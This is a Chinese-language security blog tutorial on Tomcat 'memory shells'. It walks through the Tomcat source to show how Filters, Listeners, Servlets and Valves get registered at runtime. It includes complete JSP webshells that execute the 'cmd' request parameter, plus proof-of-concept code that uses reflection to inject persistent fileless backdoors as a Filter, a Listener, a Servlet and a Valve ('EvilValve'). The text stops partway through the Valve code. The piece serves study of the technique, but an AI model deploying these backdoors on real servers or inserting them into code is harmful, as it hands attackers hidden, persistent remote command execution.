# 漏洞篇 - Tomcat 内存马
> 2024-09-26
> 来源：https://changeyourway.github.io/2024/09/26/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/

## Servlet 动态注册机制

Servlet API 提供了动态注册机制，允许在运行时动态注册 Servlets、Filters 和 Listeners，而不需要通过 `web.xml` 文件或者注解进行静态配置。这种机制从 Servlet 3.0 开始引入，提供了更灵活的方式来配置 Web 应用组件，特别是对于基于注解和自动配置的现代 Web 应用非常有用。

在 ServletContext 类中提供了一系列 addServlet、addFilter、addListener 方法来提供动态注册功能。

## 内存马初探

学习内存马需要先掌握 JavaWeb ，尤其是三大组件（Servlet、Filter、Listener）和 jsp 的知识。这部分因为我已经学过了，我就不再写博客来说明了。

此外建议看完前一篇文章 Tomcat 架构再来哦~

那么先来展示一个简单的内存马：

```
<% 
	Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

用 jsp 写的，获取参数为 cmd 的值并执行，但是无回显。

接下来改一个有回显的内存马：

```
<% 
    if(request.getParameter("cmd")!=null){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.print(new String(b));
        }
        out.print("</pre>");
    }
%>
```

将执行结果的输出流的每一个字节都打印在 web 页面上，`<pre>` 标签在 HTML 中表示预格式化文本，即其中的内容会按原样显示，保留空格、换行和其他格式。

简单测试一下这个有回显的马：

![](https://changeyourway.github.io/images/image-20240920104950670.png)

内存马又称无文件马，但是上面的 jsp 后门跟普通的马差不多嘛，还是有文件的，如何才能展示出它的无文件特性呢？且看接下来介绍的几种内存马。

## Tomcat Filter 内存马

说到 Filter ，就一定会提到 Filter 链，Filter 链的执行逻辑如下：

![](https://changeyourway.github.io/images/image-20240921104042204.png)

### 源码调试

环境：

-   JDK 17
    
-   Tomcat 8.5.68
    

那么现在有两个 Filter ：Filter1 和 Filter2 ，除了名字以外都一样，采用注解配置的方式，默认按照过滤器类名(字符串)自然排序，也就是说会先执行 Filter1 ，再执行 Filter2 。

Filter1 代码如下：

```
package filter;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter("/demo1")
public class Filter1 implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("Filter1 放行前...");
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("Filter1 放行后...");
    }

    @Override
    public void destroy() {

    }
}
```

Servlet 代码如下：

```
package servlet;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/demo1")
public class ServletDemo extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("get...");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        System.out.println("post...");
    }
}
```

确保运行时，访问 /demo1 能够输出如下结果：

![](https://changeyourway.github.io/images/image-20240921112535052.png)

#### Filter 链的调用

在 Filter1 的 doFilter 处下断点，开始调试：

![](https://changeyourway.github.io/images/image-20240921112759071.png)

发现下一步没法跟进了，需要的类在 org.apache.catalina.core 包中：

![](https://changeyourway.github.io/images/image-20240921112736451.png)

需要导入依赖：

```
<!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina -->  
<dependency>  
	<groupId>org.apache.tomcat</groupId>  
	<artifactId>tomcat-catalina</artifactId>  
	<version>8.5.68</version>  
	<scope>provided</scope>  
</dependency>
```

重新调试，跟进 ApplicationFilterChain#doFilter(ServletRequest, ServletResponse)：

![](https://changeyourway.github.io/images/image-20240921121214666.png)

这里会判断 Globals.IS\_SECURITY\_ENABLED 安全设置开了没有，开了的话就通过 java.security.AccessController#doPrivileged 方法来调用 internalDoFilter(req,res) ，没开的话就直接调用：

![](https://changeyourway.github.io/images/image-20240921121402920.png)

跟进 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse)：

![](https://changeyourway.github.io/images/image-20240921124101078.png)

在这个 filter 数组中获取要调用的 filter 链，再从中获取 filter ，调用它的 doFilter 方法。比如 Filter1.doFilter 调用到这里就获取 Filter2，调用 Filter2.doFilter 。也可以来看一下这个 filter 数组里面存了些什么：

![](https://changeyourway.github.io/images/image-20240921124341982.png)

下标为 0 存的是 Filter1，下标为 1 存的是 Filter2，下标为 2 存的是 WsFilter ，后面就没有了。也就是说理论上调用顺序是：

Filter1.doFilter -> Filter2.doFilter -> WsFilter.doFilter

WsFilter 在 org.apache.tomcat.websocket.server 包中，需要导入依赖：

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-websocket</artifactId>
    <version>8.5.68</version>
    <scope>provided</scope>
</dependency>
```

调试完之后我们来看这个调用栈：

![](https://changeyourway.github.io/images/image-20240921125706538.png)

前面是 tomcat 的一些逻辑，从 Filter1.doFilter 开始，后面就是很规律的调用 ApplicationFilterChain#doFilter(ServletRequest, ServletResponse) 和 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse) 。

而在调用完 WsFilter.doFilter 之后最后一次进入 ApplicationFilterChain#internalDoFilter(ServletRequest, ServletResponse) ，则会调用 servlet.service 方法：

![](https://changeyourway.github.io/images/image-20240921130152514.png)

也就调用到了 doGet 。这就是整个放行前 Filter 链的调用逻辑。

#### Filter 对象的创建

我们的目的是创建一个 Filter 内存马，那么弄清楚 tomcat 是怎样创建 Filter 的就很有必要了。首先来看调用 Filter1.doFilter 之前的调用栈：

![](https://changeyourway.github.io/images/image-20240921152156823.png)

前面都是与进程线程相关的一些调用，不需要关心那么多，我们直接从 StandardEngineValve#invoke(Request, Response) 开始看，往上是各种 invoke 方法的调用，直到最后一个 invoke 。

这里提一嘴 Tomcat 的一个架构：Tomcat 的 Container 包含四种子容器：Engine、Host、Context 和 Wrapper ，可以看出这四种子容器是按照顺序生成的。

看一下最后一个 invoke ，StandardWrapperValve#invoke(Request, Response)：

![](https://changeyourway.github.io/images/image-20240921152723846.png)

这里调用 filterChain.doFilter 方法，filterChain 是一个 ApplicationFilterChain 对象，这里的调用链就初见端倪了：

```
ApplicationFilterChain#doFilter -> ApplicationFilterChain#internalDoFilter -> Filter1.doFilter -> 循环前面的步骤调用 Filter.doFilter
```

说明在这之前有一个 Filter 数组就已经存好了哪些 Filter 的 doFilter 方法将要被调用。显然是存放在 filterChain 中。

那么关注一下 filterChain 是怎么来的，依然是在 StandardWrapperValve#invoke(Request, Response) 中：

![](https://changeyourway.github.io/images/image-20240921153234706.png)

通过调用 ApplicationFilterFactory.createFilterChain 方法获取了一个 filterChain ，跟进它：

![](https://changeyourway.github.io/images/image-20240921153600827.png)

必须要有 servlet 才能往下走，否则会返回空。首先是创建一个 ApplicationFilterChain 对象，有可能是直接 new ，也有可能从 request 中获取。

接着往下，把 servlet 放进 filterChain 中。从 wrapper 中获取其所属的上级容器，即 Context 。在 Tomcat 中，容器是按层次结构组织的，Wrapper 是表示单个 Servlet，而 Context 表示整个 Web 应用。获取到 StandardContext 对象之后，又从其中获取了一个 FilterMap ：

![](https://changeyourway.github.io/images/image-20240921154449749.png)

这个 FilterMaps 很重要，接下来这一步循环遍历 FilterMaps 中的 FilterMap ，根据每个 FilterMap 中的 filterName 属性去 FilterConfigs 中查找对应的 FilterConfig ，最后将 FilterConfig 添加进 filterChain ：

![](https://changeyourway.github.io/images/image-20240921155027109.png)

也就是说对每一个 FilterMap ，都要有一个 FilterConfig 与之对应，这样才能找得到。

调试一下会发现这个 FilterMaps 中果然是存着过滤器类名：

![](https://changeyourway.github.io/images/image-20240921155706222.png)

### 攻击思路

如果能修改这个 FilterMaps 和 FilterConfigs 中的值，就能够让服务器执行我们自定义的 Filter 了。如何修改呢？

FilterMaps 是从 StandardContext 中获取的，StandardContext 中可以为 FilterMaps 添加东西的方法有：

```
addFilterMap(FilterMap filterMap)
addFilterMapBefore(FilterMap filterMap)
```

这两个方法的区别在于 addFilterMap 将 filterMap 添加到 FilterMaps 数组的末尾，而 addFilterMapBefore 将 filterMap 添加到 FilterMaps 数组的开头，所以如果想让植入的 Filter 内存马第一个生效，就用 addFilterMapBefore 方法。

![](https://changeyourway.github.io/images/image-20240922113344542.png)

至于上面这两个方法的调用可以在 ApplicationFilterRegistration#addMappingForUrlPatterns 中看到：

![](https://changeyourway.github.io/images/image-20240922150744839.png)

这就告诉我们 filterMap 要怎么创建了。

FilterConfigs 则是在 StandardContext#filterStart 方法中赋值的，这里是调用的 ApplicationFilterConfig 的构造方法创建 filterConfig ：

![](https://changeyourway.github.io/images/image-20240922114038724.png)

从这里就引出另一个重要的属性 filterDefs ，FilterConfig 是依靠它来初始化的，所以如果想初始化 FilterConfig ，还需要先将 filterDefs 属性设置好。

filterDefs 在 ApplicationContext#addFilter(String, String, Filter) 中创建，这个方法也是对 ServletContext.addFilter 的一个具体实现：

```
private FilterRegistration.Dynamic addFilter(String filterName,
        String filterClass, Filter filter) throws IllegalStateException {

    if (filterName == null || filterName.equals("")) {
        throw new IllegalArgumentException(sm.getString(
                "applicationContext.invalidFilterName", filterName));
    }

    if (!context.getState().equals(LifecycleState.STARTING_PREP)) {
        //TODO Spec breaking enhancement to ignore this restriction
        throw new IllegalStateException(
                sm.getString("applicationContext.addFilter.ise",
                        getContextPath()));
    }

    FilterDef filterDef = context.findFilterDef(filterName);

    // Assume a 'complete' FilterRegistration is one that has a class and
    // a name
    if (filterDef == null) {
        filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        context.addFilterDef(filterDef);
    } else {
        if (filterDef.getFilterName() != null &&
                filterDef.getFilterClass() != null) {
            return null;
        }
    }

    if (filter == null) {
        filterDef.setFilterClass(filterClass);
    } else {
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);
    }

    return new ApplicationFilterRegistration(filterDef, context);
}
```

ApplicationContext 有一个成员属性 context ，是一个 StandardContext 对象：

![](https://changeyourway.github.io/images/image-20240922114756160.png)

上面的 ApplicationContext#addFilter(String, String, Filter) 方法就是调用 context.addFilterDef 来为这个 StandardContext 添加 FilterDef ，并且是添加到了 filterDefs 属性中：

![](https://changeyourway.github.io/images/image-20240922115025761.png)

至此 StandardContext 中三个重要的属性及其赋值过程就梳理好了，就是这三个：

![](https://changeyourway.github.io/images/image-20240922115209655.png)

总结一下：

-   **filterConfigs**
    
    -   存储每个 `Filter` 的配置对象（`FilterConfig`），在运行时为每个 `Filter` 提供配置信息。
        
    -   StandardContext#filterStart() 中赋值，filterConfig 是通过 ApplicationFilterConfig 的构造方法创建的。
        
-   **filterDefs**
    
    -   存储每个 `Filter` 的定义（`FilterDef`），记录了 `Filter` 的基本信息，包括类名和初始化参数等。在 Tomcat 启动 Web 应用时，它会通过 `web.xml` 或注解扫描生成 `FilterDef` 对象（其属性对应 xml 配置文件中的标签），然后将这些定义存储在 `filterDefs` 中。当需要实例化一个 `Filter` 时，Tomcat 会根据 `filterDefs` 中的定义，创建相应的 `Filter` 实例。
        
    -   ApplicationContext#addFilter(String, String, Filter) 中调用 StandardContext#addFilterDef 赋值。
        
-   **filterMaps**
    
    -   存储 `Filter` 与 URL 模式或 `Servlet` 名称的映射关系（`FilterMap`），决定哪些请求会被哪些 `Filter` 处理。
        
    -   ApplicationFilterRegistration#addMappingForUrlPatterns 调用 StandardContext#addFilterMapBefore(FilterMap filterMap) 赋值。
        

那么我们要做的事就明确了，获取当前 web 应用的 StandardContext ，将 filterConfigs、filterDefs、filterMaps 设置好，采用反射的方式。

### POC

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>


<%
    // 获取 ServletContext
    ServletContext servletContext = request.getSession().getServletContext();
    // 获取 ApplicationContext
    Field appContextField = servletContext.getClass().getDeclaredField("context");
    appContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
    // 获取 StandardContext
    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);
%>

<%!
    // 声明一个自定义 Filter
    public class Shell_Filter implements Filter {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {

        }

        public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) request;
            if (req.getParameter("cmd") != null) {
                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                return;
            }
            chain.doFilter(request, response);
        }

        @Override
        public void destroy() {

        }
    }
%>

<%
    // 设置 filterDefs
    Shell_Filter filter = new Shell_Filter();
    String name = "CommonFilter";
    FilterDef filterDef = new FilterDef();
    filterDef.setFilter(filter);
    filterDef.setFilterName(name);
    filterDef.setFilterClass(filter.getClass().getName());
    standardContext.addFilterDef(filterDef);

    // 设置 filterMaps
    FilterMap filterMap = new FilterMap();
    filterMap.addURLPattern("/*");
    filterMap.setFilterName(name);
    filterMap.setDispatcher(DispatcherType.REQUEST.name());
    standardContext.addFilterMapBefore(filterMap);

    // 获取 filterConfigs 属性
    Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
    Configs.setAccessible(true);
    Map filterConfigs = (Map) Configs.get(standardContext);

    // 设置 filterConfig 并放入 filterConfigs 中
    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
    constructor.setAccessible(true);
    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);
    filterConfigs.put(name, filterConfig);
%>
```

很多赋值的思路都可以在源代码中看得到的，可以去模仿。比如 StandardContext#filterStart() 中给出了 filterConfigs 的赋值方式，完全是可以去模仿着来给 filterConfigs 赋值的。

一个 web 应用只能有一个 StandardContext ，这里将三个属性设置到 StandardContext 以后，每一次不相同的请求都会重新构建一次 filterChain（多个请求相同的话会复用 filterChain），就会重新调用 ApplicationFilterFactory.createFilterChain 。那么第一次访问完这个 jsp 文件之后，第二次访问任意路由都会调用 ApplicationFilterFactory.createFilterChain ，构建出我们想要的 Filter 链，就成功的将我们自定义的 filter 注入进内存当中了。

所以**第一次访问只是设置属性，第二次访问才是注入，注入点在重新构建 filterChain 这里**。

## Tomcat Listener 内存马

那么根据前面的思路，我们也是想在服务器中动态注册一个自定义的 Listener ，如何做呢？

JavaWeb 提供了8个监听器：

![image-20210823230820586](https://changeyourway.github.io/images/image-20210823230820586.png)

ServletRequestListener 是最适合用来作为内存马的。访问任意资源时都会触发 ServletRequest 的创建和销毁，在客户端每次发起请求时，容器会（例如 Tomcat）创建 ServletRequest 对象，并在请求完成后销毁它，而 ServletRequest 创建和销毁的动作就会触发 ServletRequestListener 监听器，触发 ServletRequestListener#requestInitialized() 方法。

### 源码调试

同理我们来看一下 Listener 是如何被创建的，下面是一个简单的自定义 Listener ：

```
package Listener;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebListener;

@WebListener
public class MyServletRequestListener implements ServletRequestListener {
    // 在每次请求创建时调用
    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        System.out.println("ServletRequest created");
    }

    // 在每次请求销毁时调用
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        System.out.println("ServletRequest destroyed");
    }
}
```

#### Listener 的创建

下断点，调试，看调用栈：

![](https://changeyourway.github.io/images/image-20240922160240310.png)

是 StandardContext#fireRequestInitEvent 调用了我的 requestInitialized 方法，跟进它：

![](https://changeyourway.github.io/images/image-20240922160532778.png)

从下往上找这个 listener 是哪来的，最终找到 instances\[\] 数组。这个数组又是通过 getApplicationEventListeners 获取的，跟进一下：

![](https://changeyourway.github.io/images/image-20240922160659666.png)

applicationEventListenersList 是 StandardContext 的一个成员属性，关注一下它是在哪被赋值的：

![](https://changeyourway.github.io/images/image-20240922160832102.png)

有 setApplicationEventListeners 方法和 addApplicationEventListener 方法。添加单个 listener 还是 addApplicationEventListener 用起来更简便一些。

![](https://changeyourway.github.io/images/image-20240922161612183.png)

#### StandardContext 的获取

接下来就是获取 StandardContext 了，往前看一步 StandardHostValve#invoke ：

![](https://changeyourway.github.io/images/image-20240922162013693.png)

这里是直接通过 request.getContext() 来获取的，由于 JSP 内置了 request 对象，我们也可以使用同样的方式来获取：

```
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
%>
```

另一种获取方式如下：

```
<%
	WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
    StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
%>
```

当然也可以像之前 Filter 内存马那样去获取 StandardContext 。

### POC

```
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%!
    class ListenerMemShell implements ServletRequestListener {

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            String cmd;
            try {
                cmd = sre.getServletRequest().getParameter("cmd");
                org.apache.catalina.connector.RequestFacade requestFacade = (org.apache.catalina.connector.RequestFacade) sre.getServletRequest();
                Field requestField = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
                requestField.setAccessible(true);
                Request request = (Request) requestField.get(requestFacade);
                Response response = request.getResponse();

                if (cmd != null) {
                    InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                    int i = 0;
                    byte[] bytes = new byte[1024];
                    while ((i = inputStream.read(bytes)) != -1) {
                        response.getWriter().write(new String(bytes, 0, i));
                        response.getWriter().write("\r\n");
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void requestDestroyed(ServletRequestEvent sre) {
        }
    }
%>

<%
    ServletContext servletContext = request.getServletContext();
    Field applicationContextField = servletContext.getClass().getDeclaredField("context");
    applicationContextField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    ListenerMemShell listener = new ListenerMemShell();
    standardContext.addApplicationEventListener(listener);
%>
```

## Tomcat Servlet 内存马

动态注册一个自定义的 Servlet 。

### 源码调试

要想在内存中动态注册一个自定义的 Servlet ，同样需要知道 Servlet 是如何创建的。

由于在初始化 Servlet 之前会先初始化 Listener 和 Filter ，为了排除它们的干扰，我先将项目里的 Listener 和 Filter 全部移除，创造一个只有 Servlet 的世界。

要想站在漏洞发现者的角度去看这个问题是挺难的，我们现在直接给出结论：

StandardContext#startInternal() 在 web 容器启动时调用，这其中有两个分支调用，

一是调用 LifecycleBase#fireLifecycleEvent(String, Object)，最终调用到 StandardWrapper#setServletClass(String) 完成 Servlet 初始化；

二是调用 StandardContext#loadOnStartup(Container) ，最终调用 StandardWrapper#loadServlet() 完成 Servlet 装载。

#### Servlet 初始化

在 `org.apache.catalina.core.StandardWrapper#setServletClass()` 处下断点调试，调用栈如下：

![](https://changeyourway.github.io/images/image-20240924161027234.png)

往前看一步，看 ContextConfig#configureContext(WebXml)：

![](https://changeyourway.github.io/images/image-20240924162357053.png)

这其中有一部分是对 Servlet 的设置，主要是从 web.xml 配置文件读取的。因为我用的是注解配置，所以这个对象里面并没有我自定义的一些 Servlet ，这里边只有一些默认自带的 Servlet ，但是并不影响我们模仿这种方式来注册一个 Servlet 。

用 Wrapper 来封装 Servlet ，最后放进 context 的也是这个 wrapper ：

![](https://changeyourway.github.io/images/image-20240924164648465.png)

添加完 wrapper 之后，还要添加一个 ServletMapping 映射，相当于 Servlet 名称与路由的对应：

![](https://changeyourway.github.io/images/image-20240926133429655.png)

以上就是向 Context 中封装 Servlet 的过程，模仿这样的方式向 Context 中封装 Servlet ，也即：

```
Wrapper wrapper = standardContext.createWrapper();
wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
wrapper.setName(servlet.getServletName());
wrapper.setServletClass(servlet.getServletClass());
wrapper.setServlet(servlet);
standardContext.addChild(wrapper);
standardContext.addServletMappingDecoded("/miaoji", servlet.getServletName());
```

这里取一些必要的属性去设置就行了。

提一嘴，注解配置的 Servlet 初始化过程是这样的，最终是调用 WebAnnotationSet#loadApplicationServletAnnotations ：

![](https://changeyourway.github.io/images/image-20240924171009930.png)

它跟 web.xml 文件配置的分叉点在 ContextConfig#configureStart() 中：

![](https://changeyourway.github.io/images/image-20240924171550636.png)

默认调用 webConfig() 方法从 xml 文件中配置，如果没有设置忽略注解的话，还会调用 applicationAnnotationsConfig() 进行注解配置。

#### Servlet 装载

调用栈如下：

![](https://changeyourway.github.io/images/image-20240926131349206.png)

进入 StandardContext#loadOnStartUp(Container) 看看：

![](https://changeyourway.github.io/images/image-20240924180044910.png)

这个方法通过对 loadOnStartUp 属性的检测，就实现了一个功能：根据 loadOnStartUp 的取值来决定 Servlet 对象什么时候创建：

（1）loadOnStartUp 为负整数，则在第一次访问时创建 Servlet 对象。  
（2）loadOnStartUp 为 0 或正整数，则在服务器启动时创建 Servlet 对象，数字越小优先级越高。

然后调用 wrapper.load() 来加载：

![](https://changeyourway.github.io/images/image-20240926132057153.png)

我个人觉得 loadOnStartUp 属性倒是无足轻重，无论是什么时候创建 Servlet 对象，只要能创建就行了。设置 loadOnStartUp 为正数的好处在于第一次访问 Servlet 的时候速度更快，因为在服务器启动时已经创建了。

### addServlet 的实现

前面说到要想在内存中动态注册一个自定义的 Servlet ，需要知道 Servlet 是如何创建的。但是一定如此吗？或许我们可以不用知道 Servlet 是如何被创建的，只需要知道 Servlet 要如何动态注册就行了。

ServletContext 类中提供了 addServlet 用来动态注册 Servlet ，而 ServletContext 是个抽象类，关于这个方法的实现在 ApplicationContext 类中。我们来看 ApplicationContext 类的 addServlet 方法：

```
private ServletRegistration.Dynamic addServlet(String servletName, String servletClass,
        Servlet servlet, Map<String,String> initParams) throws IllegalStateException {

    if (servletName == null || servletName.equals("")) {
        throw new IllegalArgumentException(sm.getString(
                "applicationContext.invalidServletName", servletName));
    }

    if (!context.getState().equals(LifecycleState.STARTING_PREP)) {
        //TODO Spec breaking enhancement to ignore this restriction
        throw new IllegalStateException(
                sm.getString("applicationContext.addServlet.ise",
                        getContextPath()));
    }

    Wrapper wrapper = (Wrapper) context.findChild(servletName);

    // Assume a 'complete' ServletRegistration is one that has a class and
    // a name
    if (wrapper == null) {
        wrapper = context.createWrapper();
        wrapper.setName(servletName);
        context.addChild(wrapper);
    } else {
        if (wrapper.getName() != null &&
                wrapper.getServletClass() != null) {
            if (wrapper.isOverridable()) {
                wrapper.setOverridable(false);
            } else {
                return null;
            }
        }
    }

    ServletSecurity annotation = null;
    if (servlet == null) {
        wrapper.setServletClass(servletClass);
        Class<?> clazz = Introspection.loadClass(context, servletClass);
        if (clazz != null) {
            annotation = clazz.getAnnotation(ServletSecurity.class);
        }
    } else {
        wrapper.setServletClass(servlet.getClass().getName());
        wrapper.setServlet(servlet);
        if (context.wasCreatedDynamicServlet(servlet)) {
            annotation = servlet.getClass().getAnnotation(ServletSecurity.class);
        }
    }

    if (initParams != null) {
        for (Map.Entry<String, String> initParam: initParams.entrySet()) {
            wrapper.addInitParameter(initParam.getKey(), initParam.getValue());
        }
    }

    ServletRegistration.Dynamic registration =
            new ApplicationServletRegistration(wrapper, context);
    if (annotation != null) {
        registration.setServletSecurity(new ServletSecurityElement(annotation));
    }
    return registration;
}
```

从中同样可以提取出对于 wrapper 的封装过程。这里返回的是一个 ApplicationServletRegistration 对象，至于 mappings 映射的添加，在 ApplicationServletRegistration 的 addMapping 方法里：

![](https://changeyourway.github.io/images/image-20240926140011667.png)

### POC

下面是利用 jsp 的实现：

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="javax.servlet.http.HttpServletRequest" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    class Shell_Servlet implements Servlet{

        @Override
        public void init(ServletConfig config) throws ServletException {

        }

        @Override
        public ServletConfig getServletConfig() {
            return null;
        }

        @Override
        public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
            HttpServletRequest req = (HttpServletRequest) request;
            if (req.getParameter("cmd") != null) {
                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
            }
        }

        @Override
        public String getServletInfo() {
            return null;
        }

        @Override
        public void destroy() {

        }
    }
%>

<%
    ServletContext servletContext =  request.getServletContext();
    Field appctx = servletContext.getClass().getDeclaredField("context");
    appctx.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
    Field stdctx = applicationContext.getClass().getDeclaredField("context");
    stdctx.setAccessible(true);
    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

    // 更简单的方法 获取StandardContext
    // Field reqF = request.getClass().getDeclaredField("request");
    // reqF.setAccessible(true);
    // Request req = (Request) reqF.get(request);
    // StandardContext standardContext = (StandardContext) req.getContext();

    Shell_Servlet servlet = new Shell_Servlet();
    String name = servlet.getClass().getSimpleName();
    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setLoadOnStartup(1);
    wrapper.setName(name);
    wrapper.setServletClass(servlet.getClass().getName());
    wrapper.setServlet(servlet);
    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/miaoji", name);

    out.println("Done!");
%>
```

## Tomcat Valve 内存马

Tomcat 中，管道（Pipeline）就像一个请求处理的通道，而 Valve 是放在管道中的处理站。每个请求进入 Tomcat 时，会沿着这个管道依次经过各个 Valve，直到最终处理完成。

StandardPipeline 管理着每个容器的基本 valve（Basic Valve）：StandardEngineValve、StandardHostValve、StandardContextValve、StandardWrapperValve 。

Valve 内存马的思路就是要在内存中动态添加一个自定义的 Valve 。这里就以 StandardEngineValve 为例，关注一下它的定义：

```
package org.apache.catalina.core;

import java.io.IOException;

import javax.servlet.ServletException;

import org.apache.catalina.Host;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

final class StandardEngineValve extends ValveBase {

    //------------------------------------------------------ Constructor
    public StandardEngineValve() {
        super(true);
    }


    // --------------------------------------------------------- Public Methods

 @Override
    public final void invoke(Request request, Response response)
        throws IOException, ServletException {

        // Select the Host to be used for this Request
        Host host = request.getHost();
        if (host == null) {
            // HTTP 0.9 or HTTP 1.0 request without a host when no default host
            // is defined.
            // Don't overwrite an existing error
            if (!response.isError()) {
                response.sendError(404);
            }
            return;
        }
        if (request.isAsyncSupported()) {
            request.setAsyncSupported(host.getPipeline().isAsyncSupported());
        }

        // Ask this Host to process this request
        host.getPipeline().getFirst().invoke(request, response);
    }
}
```

继承了 ValveBase ，实现了 invoke 方法，并且 invoke 方法中能获取到 request 和 response 。

StandardPipeline 的 addValve 方法可以直接添加 valve ，而 StandardContext 的 getPipeline 方法又能直接获取到 StandardPipeline ，所以如何添加 valve 就一目了然了。

### POC

```
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>

<%
    class EvilValve extends ValveBase {
        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) request;
            if (req.getParameter("cmd") != null) {
                InputStream in = Runtime.getRuntime().exec(req.getParameter("cmd")).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
            }
            // 放行
            getNext().invoke(request, response);
        }
    }
%>
<%
    // 更简单的方法获取 StandardContext
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();
    // 添加自定义 valve
